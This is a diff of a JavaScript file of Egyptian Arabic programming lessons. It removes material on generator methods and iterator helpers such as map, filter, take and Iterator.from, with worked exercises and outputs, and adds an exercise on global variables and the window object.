-| لسه متشغّلش | الـ error يطلع برّه على طول والـ generator يخلص |
-| خلص | الـ error يطلع برّه على طول |
-
----
-
-## ٤. [[yield*]]: سلّم لغيرك
-
-~~~js
-function* inner() { try { const x = yield 'i1'; console.log('  inner got', x); yield 'i2'; return 'inner-done'; } finally { console.log('  inner finally'); } }
-function* outer() { const r = yield* inner(); console.log('  yield* returned', r); yield 'o1'; }
-const o = outer();
-console.log(o.next(), o.next('hello'), o.next(), o.next());
-~~~
-
-~~~text الناتج
-  inner got hello
-  inner finally
-  yield* returned inner-done
-{ value: 'i1', done: false } { value: 'i2', done: false } { value: 'o1', done: false } { value: undefined, done: true }
-~~~
-
-(السطور اللي بتبدأ بمسافة اتطبعت الأول لأن [[console.log]] بيحسب الـ arguments الأربعة قبل ما يطبع.)
-
-- [[next('hello')]] وصلت للـ [[inner]] مباشرة: [[inner got hello]]. الـ [[outer]] مشافهاش.
-- لما [[inner]] عمل [[return 'inner-done']]، القيمة دي **مطلعتش** كـ [[value]] برّه: بقت قيمة الـ [[yield*]] نفسها ([[r]]).
-- و [[return]] برّه بتوصل جوه: [[o2.next()]] وبعدين [[o2.return('cut')]] طبعت [[inner finally]] ورجّعت [[{ value: 'cut', done: true }]].
-- [[yield*]] على أي iterable: [[ yield* [1, 2] ]] و [[yield* 'ab']] و [[yield* map.keys()]].
-
----
-
-## ٥. [[Generator]] من جوه
-
-كل generator object بيورث من [[talk.prototype]] (كل generator function ليها [[prototype]] خاص بيها)، وده بيورث من [[Generator.prototype]] اللي عليه التلاتة:
-
-~~~text الناتج: Object.getOwnPropertyNames(Object.getPrototypeOf(talk.prototype))
-[ 'constructor', 'next', 'return', 'throw' ]
-~~~
-
-و [[Object.prototype.toString.call(g)]] بـ [[[object Generator]]]، و [[ g[Symbol.iterator]() === g ]] بـ [[true]] (iterator و iterable). و [[Generator]] مش global: بتوصله من [[Object.getPrototypeOf]] (درس «AsyncFunction و GeneratorFunction و AsyncGeneratorFunction» في الوحدة دي).
-
----
-
-## الخلاصة
-
-| الـ method | الـ [[yield]] الواقفة بتبقى | النتيجة |
-|---|---|---|
-| [[next(v)]] | قيمتها [[v]] (أول مرة: بتتجاهل) | لحد الـ [[yield]] الجاية أو الآخر |
-| [[return(v)]] | [[return v]]، والـ [[finally]] بتشتغل | [[{ value: v, done: true }]] غالبًا |
-| [[throw(e)]] | [[throw e]] | الـ [[catch]] جوه أو الـ error برّه |
-| [[yield* x]] | بتمرّر التلاتة لـ [[x]] | قيمتها الـ [[return]] بتاع [[x]] |`,
-          lines: [
-            R`generator function بتسأل سؤالين وتستنى الإجابات من برّه.`,
-            R`[[try]] عشان الـ [[finally]] تشتغل في كل طرق الخروج.`,
-            R`[[yield]] بتطلّع السؤال لبرّه وتوقف، ولما [[next(x)]] ييجي، [[x]] بيبقى قيمة [[name]].`,
-            R`نفس الفكرة: السؤال التاني فيه الاسم اللي وصل، والإجابة بتتحط في [[qty]].`,
-            R`تحقق: لو الكمية مش رقم أكبر من صفر بنرمي error جوه الـ generator.`,
-            R`[[return]] بيخلّص الـ generator: الـ object ده بيبقى [[value]] مع [[done: true]].`,
-            R`[[finally]]: بتشتغل في الخلاص العادي، وفي [[return()]]، وفي [[throw()]].`,
-            R`بتطبع إنه اتقفل عشان نشوف إمتى بالظبط.`,
-            R`قفلة الـ [[finally]].`,
-            R`قفلة [[checkout]].`,
-            R`generator object جديد. ولا سطر جوه اشتغل لسه.`,
-            R`أول [[next]]: القيمة اللي اتبعتت ملهاش [[yield]] مستنياها فبتتجاهل، والناتج السؤال الأول.`,
-            R`[[name]] بقى [['Sara']]، والناتج السؤال التاني والاسم جواه.`,
-            R`[[qty]] بقى 3، الـ [[return]] اشتغل، والـ [[finally]] طبعت [[اتقفل]] قبل ما النتيجة توصل.`,
-            R`generator تاني عشان نجرّب الإلغاء.`,
-            R`أول [[next]] بيشغّله لحد السؤال الأول ويوقف هناك، عشان يبقى فيه [[yield]] واقفة نلغيها.`,
-            R`[[return('ألغى')]]: الـ [[yield]] الواقفة بقت [[return]]، فالـ [[finally]] اشتغلت والنتيجة [[{ value: 'ألغى', done: true }]].`,
-            R`generator تالت عشان نجرّب [[throw]].`,
-            R`برضه نوصّله لأول [[yield]]، عشان الـ error يترمي جوه الـ [[try]].`,
-            R`[[throw]] رمى الـ error مكان الـ [[yield]]: مفيش [[catch]] جوه، فالـ [[finally]] اشتغلت والـ error طلع للـ [[catch]] اللي برّه.`,
-          ],
-          ref: [
-            { t: "MDN: Generator", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Generator" },
-            { t: "MDN: Generator.prototype.next()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Generator/next" },
-            { t: "MDN: Generator.prototype.return()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Generator/return" },
-            { t: "MDN: Generator.prototype.throw()", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Generator/throw" },
-            { t: "MDN: yield*", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/yield*" },
-            { t: "ECMAScript: Generator Objects", url: "https://tc39.es/ecma262/multipage/control-abstraction-objects.html#sec-generator-objects" },
-          ],
-          pre: ["js/iteration protocols: next و return و throw", { to: "js/try و catch و finally", why: R`[[finally]] وإمتى بتشتغل` }, { to: "js/iterators و generators", why: R`[[function*]] و [[yield]] و lazy في أبسط صورهم` }],
-        },
-        {
-          cmd: "Iterator helpers: Iterator.from و Iterator.concat",
-          title: "map و filter و take و reduce على أي iterator من غير ما تعمل array: كل الـ helpers، و Iterator.from و Iterator.concat، وإمتى lazy بيكسب فعلًا",
-          desc: R`من ES2025 كل iterator بيورث من [[Iterator.prototype]] عليه **helpers** شبه بتوع الـ array: [[map]] و [[filter]] و [[take]] و [[drop]] و [[flatMap]] بيرجّعوا iterator جديد **lazy** (مبيعملوش حاجة لحد ما حد يطلب)، و [[reduce]] و [[toArray]] و [[forEach]] و [[some]] و [[every]] و [[find]] بيلفوا فعلًا ويرجّعوا نتيجة. فتقدر تكتب [[map.entries().filter(...).map(...)]] أو تشتغل على generator لانهائي أو على ٢ مليون صف من غير ما تحطهم في array.
-
-• [[Iterator.from(x)]]: بيحوّل أي iterable أو أي object عنده [[next]] بس لـ iterator عليه الـ helpers.
-• [[Iterator.concat(a, b, ...)]]: iterator واحد بيلف على كذا iterable ورا بعض (موجود في Chrome 157، ومش موجود في Node 24.22، والبديل generator من سطرين).
-
-والـ lazy مش «أسرع دايمًا»: لو الداتا أصلًا array في الذاكرة، سلسلة الـ array أسرع. الـ helpers بتكسب لما المصدر generator أو ملف أو لانهائي، أو لما محتاج أول كام نتيجة بس.`,
-          example: R`// helpers على أي iterator: lazy، قيمة قيمة
-function* naturals() { for (let n = 1; ; n++) yield n; }
-let calls = 0;
-const oddSquares = naturals().map((n) => { calls++; return n * n; }).filter((n) => n % 2).take(3).toArray();
-console.log(oddSquares, 'calls', calls);
-const stock = new Map([['tea', 3], ['milk', 0], ['rice', 7]]);
-console.log(stock.entries().filter(([, q]) => q > 0).map(([k]) => k).toArray());
-const nums = () => [5, 12, 8, 130, 44].values();
-console.log(nums().drop(1).take(3).toArray(), nums().reduce((a, b) => a + b, 0));
-console.log(nums().some((x) => x > 100), nums().every((x) => x > 1), nums().find((x) => x > 10));
-console.log([ ['a', [1, 2] ], ['b', [3] ] ].values().flatMap(([, v]) => v).toArray());
-let n = 0;
-const legacy = { next: () => (n < 3 ? { value: ++n, done: false } : { value: undefined, done: true }) };
-console.log(Iterator.from(legacy).map((x) => x * 10).toArray(), typeof Iterator.concat);`,
-          try: R`سلسلة صغيرة بـ [[map]] و [[filter]] بيكتبوا في [[log]] كل ما يتنادوا، مرة على [[[1, 2, 3].values()]] ومرة على [[[1, 2, 3]]] نفسها (array methods). اطبع [[log]] في الحالتين، وفي حالة الـ iterator اكتب [[log.push('built')]] بعد ما تبني السلسلة وقبل [[toArray()]].`,
-          sol: R`~~~js order.mjs
-const log = [];
-const pipeline = [1, 2, 3].values().map((x) => { log.push('map ' + x); return x; }).filter((x) => { log.push('filter ' + x); return x !== 2; });
-log.push('built');
-pipeline.toArray();
-console.log(log.join(' | '));
-const log2 = [];
-[1, 2, 3].map((x) => { log2.push('map ' + x); return x; }).filter((x) => { log2.push('filter ' + x); return x !== 2; });
-console.log(log2.join(' | '));
-~~~
-
-~~~text الناتج (Node 24.22)
-built | map 1 | filter 1 | map 2 | filter 2 | map 3 | filter 3
-map 1 | map 2 | map 3 | filter 1 | filter 2 | filter 3
-~~~
-
-- **الـ iterator:** بناء السلسلة معملش أي حاجة ([[built]] الأول). ولما [[toArray]] طلبت، كل قيمة عدّت على [[map]] وبعدين [[filter]] قبل ما اللي بعدها تبدأ: «عمودي».
-- **الـ array:** [[map]] خلّص على الكل وعمل array جديدة، وبعدين [[filter]] على الكل: «أفقي»، و array وسطانية في الذاكرة.
-- ده سبب إن [[take(3)]] على iterator بيوقف الشغل كله بدري، وعلى array الشغل بيكون اتعمل خلاص.`,
-          practice: [
-            { lvl: 'سريع', t: R`**اقرا وتوقّع:** الـ [[firstSquares]] فوق في المثال: [[calls]] طلع 5. ليه 5 بالظبط مش 3 ومش 6؟ اكتب الأرقام اللي دخلت [[map]] واحد واحد، وإيه اللي عدّى من [[filter]].`, done: R`كتبت ١ و ٢ و ٣ و ٤ و ٥، وإن [[filter]] عدّى ١ و ٩ و ٢٥ ووقف [[take]] بعد التالت، فـ [[naturals]] موصلش لـ 6.`, sol: R`| الرقم من [[naturals]] | [[map]] طلّع | [[filter]] (فردي؟) | [[take(3)]] عنده |
-|---|---|---|---|
-| 1 | 1 | أيوه | 1 من 3 |
-| 2 | 4 | لأ، بيطلب اللي بعده | لسه 1 |
-| 3 | 9 | أيوه | 2 من 3 |
-| 4 | 16 | لأ | لسه 2 |
-| 5 | 25 | أيوه | 3 من 3: خلاص، بيقول [[done]] |
-
-~~~text الناتج (Node 24.22)
-[ 1, 9, 25 ] calls 5
-~~~
-
-**الشرح:** [[toArray]] بتطلب من [[take]]، و [[take]] من [[filter]]، و [[filter]] بتفضل تطلب من [[map]] لحد ما تلاقي واحد يعدّي، و [[map]] بتطلب من [[naturals]]. بعد التالت، [[take]] بيرد [[done]] وكمان **بيقفل** اللي قبله ([[return]] بتوصل لحد الـ generator). فالـ generator اللانهائي اتحسب منه ٥ قيم بس. ولو قلبت الترتيب ([[take(3)]] قبل [[filter]]) هياخد ١ و ٢ و ٣ ويفلتر منهم: [[[ 1, 9 ]]].` },
-            { lvl: 'تطبيق', t: R`**بيانات حقيقية:** لوج سيرفر (تحت) فيه سطر فاضي وسطر بايظ. من غير ما تعمل arrays وسطانية: هات **أول اتنين** طلبات status بتاعهم 500 أو أكتر (المسار والـ status والوقت)، وأبطأ طلب في اللوج كله.
-
-~~~text access.log
-2026-11-21T10:00:01Z GET /home 200 12ms
-2026-11-21T10:00:02Z GET /api/cart 500 340ms
-2026-11-21T10:00:03Z POST /api/order 201 88ms
-
-2026-11-21T10:00:04Z GET /api/cart 500 410ms
-2026-11-21T10:00:05Z GET /img/logo.png 404 3ms
-2026-11-21T10:00:06Z POST /api/pay 502 1200ms
-broken line here
-2026-11-21T10:00:07Z GET /home 200 9ms
-~~~`, done: R`بيطبع [[/api/cart 500 340ms]] و [[/api/cart 500 410ms]] بس (مش الـ 502 لأن [[take(2)]])، وأبطأ طلب [[/api/pay 1200ms]]، والسطر الفاضي والبايظ مش عاملين error.`, sol: R`~~~js errors.mjs
-const log = $__bt2026-11-21T10:00:01Z GET /home 200 12ms
-2026-11-21T10:00:02Z GET /api/cart 500 340ms
-2026-11-21T10:00:03Z POST /api/order 201 88ms
-
-2026-11-21T10:00:04Z GET /api/cart 500 410ms
-2026-11-21T10:00:05Z GET /img/logo.png 404 3ms
-2026-11-21T10:00:06Z POST /api/pay 502 1200ms
-broken line here
-2026-11-21T10:00:07Z GET /home 200 9ms$__bt;
-const parsed = log.split('\n').values()
-  .filter((line) => line.trim() !== '')
-  .map((line) => line.split(' '))
-  .filter((parts) => parts.length === 5)
-  .map(([time, method, path, status, ms]) => ({ time, method, path, status: Number(status), ms: parseInt(ms) }));
-const firstServerErrors = parsed.filter((r) => r.status >= 500).take(2).toArray();
-console.log(firstServerErrors.map((r) => r.path + ' ' + r.status + ' ' + r.ms + 'ms'));
-const slowest = log.split('\n').values().filter((l) => l.split(' ').length === 5).map((l) => l.split(' ')).reduce((best, p) => (parseInt(p[4]) > parseInt(best[4]) ? p : best));
-console.log('أبطأ طلب:', slowest[2], slowest[4]);
-~~~
-
-~~~text الناتج (Node 24.22)
-[ '/api/cart 500 340ms', '/api/cart 500 410ms' ]
-أبطأ طلب: /api/pay 1200ms
-~~~
-
-**الشرح:** [[split('\n')]] بيعمل array السطور (ده مقبول هنا: النص كله في الذاكرة أصلًا)، و [[.values()]] بيحوّلها iterator عشان باقي السلسلة تبقى lazy. الـ [[filter]] الأولى بتشيل السطر الفاضي، والتانية ([[parts.length === 5]]) بتشيل البايظ قبل ما الـ destructuring يحاول يقراه. و [[parseInt('340ms')]] بتقرا الأرقام وتقف عند [[m]]. و [[reduce]] من غير قيمة بداية بياخد أول عنصر بداية، وده آمن هنا لأن فيه سطور؛ على لوج فاضي كان هيرمي [[TypeError: Reduce of a done iterator with no initial value]]. في ملف حقيقي كبير، [[log.split]] تتبدّل بقراية سطر سطر (درس «AsyncIterator و async generators» ومشروع الوحدة الكبير).` },
-            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** فيه غلطتين. اقرا الناتج وصلّح:
-
-~~~js
-const words = ['tea', 'rice'].values().map((w) => w.toUpperCase());
-console.log(words.toArray(), words.toArray());
-console.log(['ab', 'cd'].values().flatMap((w) => w).toArray());
-~~~`, done: R`المرتين بيطبعوا [[[ 'TEA', 'RICE' ]]]، و [[flatMap]] بيطبع الحروف الأربعة.`, sol: R`~~~text الناتج قبل التصليح (Node 24.22)
-[ 'TEA', 'RICE' ] []
-TypeError: Iterator.prototype.flatMap called on non-object
-~~~
-
-~~~js fixed.mjs
-const upper = () => ['tea', 'rice'].values().map((w) => w.toUpperCase());
-console.log(upper().toArray(), upper().toArray());
-console.log(['ab', 'cd'].values().flatMap((w) => w[Symbol.iterator]()).toArray(), ['ab', 'cd'].values().flatMap((w) => [...w]).toArray());
-~~~
-
-~~~text الناتج (Node 24.22)
-[ 'TEA', 'RICE' ] [ 'TEA', 'RICE' ]
-[ 'a', 'b', 'c', 'd' ] [ 'a', 'b', 'c', 'd' ]
-~~~
-
-- **الأولى:** [[words]] iterator مش array: [[toArray]] الأولى استهلكته، والتانية لقته فاضي. الحل: دالة بتبني السلسلة كل مرة، أو [[toArray()]] مرة واحدة وخزّن الـ array.
-- **التانية:** [[flatMap]] بتاع الـ iterators بيرفض الـ string كنتيجة بقصد (عشان [[flatMap(x => x)]] على كلمات ميفردهاش حروف بالغلط زي ما بيحصل في حاجات تانية)، والرسالة مضللة ([[called on non-object]]). لو عايز الحروف فعلًا، رجّع iterator ([[w[Symbol.iterator]()]]) أو array ([[[...w]]]). وده فرق عن [[Array.prototype.flatMap]] اللي مبيفردش الـ strings أصلًا (بيحطها زي ما هي).` },
-            { lvl: 'تحدي', t: R`**مسألة:** [[firstDuplicate(iterable)]] بترجّع أول قيمة اتكررت (أول ما تظهر للمرة التانية)، أو [[undefined]]. لازم تشتغل على generator لانهائي (وتقفله)، وعلى string، بـ [[Iterator.from]] و [[find]] و [[Set]].`, done: R`[[firstDuplicate([3, 1, 4, 1, 5])]] بـ 1، و [['abcb']] بـ [['b']]، و [[[1, 2, 3]]] بـ [[undefined]]، والـ generator اللانهائي بيرجّع 0 والـ [[finally]] بتاعه اشتغلت، والتمرين اللي بيتصحح لوحده عدّى.`, sol: R`~~~js first-duplicate.mjs
-function firstDuplicate(iterable) {
-  const seen = new Set();
-  return Iterator.from(iterable).find((x) => (seen.has(x) ? true : (seen.add(x), false)));
-}
-function* forever(log) { try { for (let i = 0; ; i++) { yield i % 7; } } finally { log.push('closed'); } }
-const log = [];
-console.log(firstDuplicate([3, 1, 4, 1, 5]), firstDuplicate('abcb'), firstDuplicate([1, 2, 3]), firstDuplicate(forever(log)), log);
-console.log(firstDuplicate([NaN, 0, NaN]), firstDuplicate([0, -0]));
-~~~
-
-~~~text الناتج (Node 24.22)
-1 b undefined 0 [ 'closed' ]
-NaN -0
-~~~
-
-**الشرح:** [[Iterator.from]] بيقبل أي iterable (array و string و generator) ويدّيك iterator عليه [[find]]. و [[find]] بيقف أول ما الدالة ترجّع [[true]] و **بيقفل** المصدر (فالـ [[finally]] بتاعة [[forever]] اشتغلت عند 0 في اللفة التامنة). و [[(seen.add(x), false)]] بـ comma operator: ضيف وارجع [[false]] في سطر. والـ [[Set]] بيقارن بـ SameValueZero، فـ [[NaN]] بيتعرف إنه متكرر، و [[0]] و [[-0]] واحد (ورجّع [[-0]] لأنه التاني).` },
-            { lvl: 'تحدي', t: R`**قارن وقيس:** مليون رقم في array **جاهزة في الذاكرة**. احسب مجموع [[x * 2]] للي بيقبل القسمة على 3 بـ ٣ طرق: سلسلة array ([[map]] و [[filter]] و [[reduce]])، وسلسلة iterator على [[big.values()]]، و [[for...of]] عادي. شغّل ٣ مرات وقارن.`, done: R`عندك ٣ أرقام لكل طريقة، ولقيت إن الـ iterator **مش** الأسرع هنا، وتقدر تقول إمتى بيكسب.`, sol: R`~~~js speed.mjs
-const big = Array.from({ length: 1_000_000 }, (_, i) => i);
-let t = performance.now(); let s1 = big.map((x) => x * 2).filter((x) => x % 3 === 0).reduce((a, b) => a + b, 0); const ta = performance.now() - t;
-t = performance.now(); let s2 = big.values().map((x) => x * 2).filter((x) => x % 3 === 0).reduce((a, b) => a + b, 0); const tb = performance.now() - t;
-t = performance.now(); let s3 = 0; for (const x of big) { const y = x * 2; if (y % 3 === 0) s3 += y; } const tc = performance.now() - t;
-console.log('array', ta.toFixed(1), 'iterator', tb.toFixed(1), 'for-of', tc.toFixed(1));
-~~~
-
-~~~text الناتج (Node 24.22، ٣ مرات)
-array 30.9 iterator 40.4 for-of 12.9
-array 29.5 iterator 40.2 for-of 12.6
-array 28.2 iterator 37.4 for-of 12.6
-~~~
-
-**القراءة:** لما الداتا array جاهزة ومحتاج **كل** العناصر، الـ helpers أبطأ من الـ array methods (كل قيمة بتعدّي على [[next()]] و object [[{ value, done }]] في كل مرحلة)، و [[for...of]] العادي أسرع الكل بمرتين. الـ helpers بتكسب في حالتين اتقاسوا في الدرس: (١) محتاج أول كام نتيجة بس ([[take(5)]] عمل ١٣ نداء بدل مليون)، (٢) المصدر مش array أصلًا (generator أو ملف)، فالـ array محتاجة تتعمل الأول: ٢ مليون object من generator خدوا ١٦٤ms و 244 MB كـ array، و 89ms و 64 MB كـ iterator.` },
-          ],
-          check: { lang: "js", starter: R`function firstDuplicate(iterable) {
-  // Iterator.from و find و Set
-}`, tests: R`function* forever(log) { try { for (let i = 0; ; i++) yield i % 7; } finally { log.push('closed'); } }
-test("array", () => expect(firstDuplicate([3, 1, 4, 1, 5])).toBe(1));
-test("string", () => expect(firstDuplicate('abcb')).toBe('b'));
-test("مفيش تكرار", () => expect(firstDuplicate([1, 2, 3])).toBe(undefined));
-test("فاضي", () => expect(firstDuplicate([])).toBe(undefined));
-test("generator لانهائي وبيتقفل", () => { const log = []; const r = firstDuplicate(forever(log)); expect([r, log]).toEqual([0, ['closed'] ]); });
-test("أول تكرار مش أول قيمة متكررة", () => expect(firstDuplicate([1, 2, 2, 1])).toBe(2));`, solution: R`function firstDuplicate(iterable) {
-  const seen = new Set();
-  return Iterator.from(iterable).find((x) => (seen.has(x) ? true : (seen.add(x), false)));
-}` },
-          flag: "script",
-          deep: {
-            why: R`قبل الـ helpers كان عندك اختيارين وحشين: تحوّل الـ iterator لـ array ([[[...it]]]) وتخسر الـ lazy والذاكرة، أو تكتب [[for...of]] بـ [[if]] و [[break]] وعدّادات. الـ helpers بيدّوك نفس شكل [[arr.map().filter()]] اللي متعوّد عليه، على Map و Set و generators و streams، ومن غير arrays وسطانية. وبيبقى سهل تشتغل على مصدر لانهائي أو ضخم وتاخد منه اللي محتاجه بس.`,
-            how: R`[[map]] و [[filter]] و [[take]] و [[drop]] و [[flatMap]] بيرجّعوا «Iterator Helper» object ([[[object Iterator Helper]]]) ماسك الـ iterator اللي قبله والدالة. كل [[next()]] عليه بينادي [[next()]] على اللي قبله **مرة أو أكتر** (الـ [[filter]] بيكرّر لحد ما يلاقي واحد يعدّي)، فالقيم بتمشي واحدة واحدة في السلسلة كلها. و [[return()]] على أي helper بيقفل اللي قبله لحد المصدر.
-
-[[reduce]] و [[toArray]] و [[forEach]] و [[some]] و [[every]] و [[find]] بيلفوا بنفسهم. التلاتة الأخيرين بيقفوا بدري وبيقفلوا المصدر بـ [[return]]. والدوال بتاخد [[(value, index)]] (counter بيبدأ من 0)، من غير الـ argument التالت اللي في الـ arrays (مفيش array).
-
-[[Iterator.from(x)]]: لو [[x]] string أو عنده [[Symbol.iterator]] بياخد الـ iterator بتاعه، ولو الـ iterator ده بيورث من [[Iterator.prototype]] بيرجّعه زي ما هو، وإلا بيلفّه في wrapper. ولو [[x]] object من غير [[Symbol.iterator]] بيعامله كـ iterator ويلفّه (حتى لو معندوش [[next]]: [[Iterator.from({})]] بيعدّي والـ error بييجي عند أول [[next]]: [[TypeError: undefined is not a function]]، اتجرّب).`,
-            when: R`استخدم الـ helpers لما: المصدر iterator أصلًا (Map و Set و generators و [[matchAll]] و [[readline]] بعد ما تجمعه، و [[str.split]] الكبير بعد [[values()]])، أو محتاج أول N، أو المصدر لانهائي، أو الذاكرة مهمة. استخدم array methods لما: الداتا array صغيرة أو متوسطة وجاهزة في الذاكرة ومحتاج كلها، أو محتاج [[sort]] أو index عشوائي أو تلف مرتين. واستخدم [[for...of]] لما الأداء الخام مهم أو المنطق فيه حالات كتير. و [[Iterator.concat]] لما عايز تلف على كذا مصدر كأنهم واحد من غير ما تلزقهم في array (الملفات الشهرية مثلًا).`,
-            mistakes: R`- تستخدم نفس الـ helper iterator مرتين: التانية فاضية.
-- [[take]] و [[drop]] بأرقام سالبة أو [[NaN]]: [[RangeError: -1 must be positive]] و [[RangeError: NaN must be positive]].
-- [[map(5)]] أو أي حاجة مش function: [[TypeError: number 5 is not a function]].
-- [[reduce]] من غير قيمة بداية على iterator فاضي: [[TypeError: Reduce of a done iterator with no initial value]].
-- [[flatMap]] يرجّع string: [[TypeError: Iterator.prototype.flatMap called on non-object]].
-- تستنى [[forEach]] ترجّع حاجة: بترجّع [[undefined]]، وبتلف على طول (مش lazy).
-- [[Iterator.from(5)]]: [[TypeError: Iterator.from called on non-object]].
-- تفتكر [[naturals().toArray()]] هتخلص: لانهائي = البرنامج يعلّق. [[take]] الأول.
-- تستخدم [[Iterator.concat]] في Node 24: [[undefined]]. استخدم الـ fallback لحد ما Node يضيفه.
-- تفتكر الـ helpers موجودة على الـ async iterators: لأ ([[AsyncIterator.prototype]] معندوش [[map]]). اجمع بـ [[Array.fromAsync]] أو اكتب async generator.`,
-          },
-          teach: R`## الفكرة في سطر
-
-نفس [[map]] و [[filter]] اللي تعرفها، بس على iterator: مبتعملش array، وبتشتغل قيمة قيمة لما حد يطلب. الناتج من Node 24.22 إلا [[Iterator.concat]] (Chrome 157).
-
----
-
-## ١. السلسلة على generator لانهائي
-
-~~~js
-function* naturals() { for (let n = 1; ; n++) yield n; }
-let calls = 0;
-const oddSquares = naturals().map((n) => { calls++; return n * n; }).filter((n) => n % 2).take(3).toArray();
-console.log(oddSquares, 'calls', calls);
-~~~
-
-~~~text الناتج
-[ 1, 9, 25 ] calls 5
-~~~
-
-- [[naturals()]] لانهائي. لو كانت array methods، [[map]] كانت هتحاول تخلّص الكل وتعلّق.
-- [[map]] اتنادت ٥ مرات بس: [[take(3)]] وقّف السلسلة بعد تالت رقم فردي (تمرين «اقرا وتوقّع» فيه الجدول).
-
----
-
-## ٢. اللي بيرجّعوا iterator (lazy)
-
-| الـ helper | بيعمل إيه | مثال اتشغّل |
-|---|---|---|
-| [[map(fn)]] | كل قيمة تعدّي على [[fn(value, index)]] | [[['a', 'b', 'c'].values().map((x, i) => i + x)]] بـ [[[ '0a', '1b', '2c' ]]] |
-| [[filter(fn)]] | سيب اللي [[fn]] بترجّع له truthy | [[stock.entries().filter(([, q]) => q > 0)]] |
-| [[take(n)]] | أول [[n]] وبعدين [[done]] ويقفل المصدر | [[nums().take(2)]] |
-| [[drop(n)]] | اتخطى أول [[n]] | [[nums().drop(1).take(3)]] بـ [[[ 12, 8, 130 ]]] |
-| [[flatMap(fn)]] | [[fn]] ترجّع iterable أو iterator، وقيمه تطلع واحدة واحدة | تحت في القسم ٤ |
-
-~~~js
-const stock = new Map([['tea', 3], ['milk', 0], ['rice', 7]]);
-console.log(stock.entries().filter(([, q]) => q > 0).map(([k]) => k).toArray());
-~~~
-
-~~~text الناتج
-[ 'tea', 'rice' ]
-~~~
-
-[[stock.entries()]] iterator على [[[key, value]]]، و [[([, q])]] destructuring بيتخطى المفتاح (الفاصلة الأولى فاضية) وياخد الكمية. ومفيش ولا array اتعملت لحد [[toArray]].
-
----
-
-## ٣. اللي بيلفوا ويرجّعوا نتيجة
-
-~~~js
-const nums = () => [5, 12, 8, 130, 44].values();
-console.log(nums().drop(1).take(3).toArray(), nums().reduce((a, b) => a + b, 0));
-console.log(nums().some((x) => x > 100), nums().every((x) => x > 1), nums().find((x) => x > 10));
-~~~
-
-~~~text الناتج
-[ 12, 8, 130 ] 199
-true true 12
-~~~
-
-| الـ helper | بيرجّع | بيقف بدري ويقفل المصدر؟ |
-|---|---|---|
-| [[toArray()]] | array بكل القيم | لأ، بيلف لآخره |
-| [[reduce(fn, init)]] | القيمة المتجمّعة، ومن غير [[init]] أول قيمة بتبقى البداية | لأ |
-| [[forEach(fn)]] | [[undefined]] دايمًا | لأ |
-| [[some(fn)]] | [[true]] أول ما واحدة تعدّي | أيوه، عند أول [[true]] |
-| [[every(fn)]] | [[false]] أول ما واحدة تفشل | أيوه، عند أول [[false]] |
-| [[find(fn)]] | أول قيمة تعدّي أو [[undefined]] | أيوه |
-
-[[nums]] دالة مش متغير: كل سطر محتاج iterator جديد، لأن أي iterator بيتستهلك (لو كتبت [[const it = ...]] واستخدمته في [[some]] وبعدين [[every]]، التانية هتشتغل على الباقي بس).
-
-### القفل اتقاس
-
-~~~text الناتج: src(log).some((x) => x === 2) على generator لانهائي فيه finally
-true gen 1 | gen 2 | closed
-~~~
-
-[[some]] لقى 2، ونادى [[return]] على الـ generator فالـ [[finally]] اشتغلت ([[closed]]). نفس الحاجة مع [[take(2).toArray()]].
-
----
-
-## ٤. [[flatMap]]: كل قيمة تبقى كذا قيمة
-
-~~~js
-console.log([ ['a', [1, 2] ], ['b', [3] ] ].values().flatMap(([, v]) => v).toArray());
-~~~
-
-~~~text الناتج
-[ 1, 2, 3 ]
-~~~
-
-الدالة رجّعت array لكل عنصر، و [[flatMap]] لف على كل array وطلّع قيمها. ولو رجّعت string بيرمي [[TypeError: Iterator.prototype.flatMap called on non-object]] بقصد (تمرين «صلّح»).
-
----
-
-## ٥. [[Iterator.from]]: أي حاجة تبقى iterator بـ helpers
-
-~~~js
-let n = 0;
-const legacy = { next: () => (n < 3 ? { value: ++n, done: false } : { value: undefined, done: true }) };
-console.log(Iterator.from(legacy).map((x) => x * 10).toArray(), typeof Iterator.concat);
-~~~
-
-~~~text الناتج
-[ 10, 20, 30 ] undefined
-~~~
-
-- [[legacy]] object عنده [[next]] بس (زي iterators مكتبات قديمة): [[legacy.map]] بـ [[undefined]]. [[Iterator.from]] لفّه في iterator بيورث من [[Iterator.prototype]]، فـ [[map]] اشتغلت.
-- [[Iterator.from([1, 2])]] و [[Iterator.from('أب')]] و [[Iterator.from(new Set([1, 1, 2]))]] طلّعوا [[[ 1, 2 ]]] و [[[ 'أ', 'ب' ]]] و [[[ 1, 2 ]]].
-- لو اللي اديته iterator حقيقي أصلًا: [[Iterator.from(ai) === ai]] بـ [[true]]، مفيش wrapper.
-- [[typeof Iterator.concat]] بـ [[undefined]] في Node 24.22: القسم الجاي.
-
----
-
-## ٦. [[Iterator.concat]]: كذا مصدر كأنهم واحد
-
-موجود في Chrome 157، واتشغّل في الـ Console هناك:
-
-~~~js
-function* a() { yield 1; yield 2; }
-Iterator.concat(a(), [3, 4], new Set([5])).toArray();
-Object.prototype.toString.call(Iterator.concat([1]));
-Iterator.concat('ab');
+            { lvl: 'سريع', t: R`**اقرا وتوقّع:** سكربت عادي (مش module) فيه [[var shopName = "متجر النور"; let visits = 3; function greet() {} var name = 42;]] وبعده [[console.log(window.shopName, window.visits, typeof window.greet, typeof name, name === 42)]]. اكتب الـ ٥ قيم قبل ما تشغّل (من قسم ١ في الشرح).`, done: R`الخمسة صح، وتقدر تقول ليه [[name === 42]] بقت [[false]].`, sol: R`~~~html d1.html
+<script>
+var shopName = "متجر النور";
+let visits = 3;
+function greet() { return "أهلًا"; }
+var name = 42;
+console.log(window.shopName, window.visits, typeof window.greet, typeof name, name === 42);
+</script>
 ~~~
 
 ~~~text الناتج (Chrome 157)
-[1, 2, 3, 4, 5]
-[object Iterator Helper]
-TypeError: Iterator.concat called on non-object
+متجر النور undefined function string false
 ~~~
 
-- بياخد iterables ويلف عليهم ورا بعض، lazy: اتجرّب بـ generators بتسجّل، و [[start 2]] متكتبتش غير لما الأول خلص.
-- الـ strings مرفوضة (لازم objects)، زي [[flatMap]].
-
-### البديل في Node 24
-
-~~~js
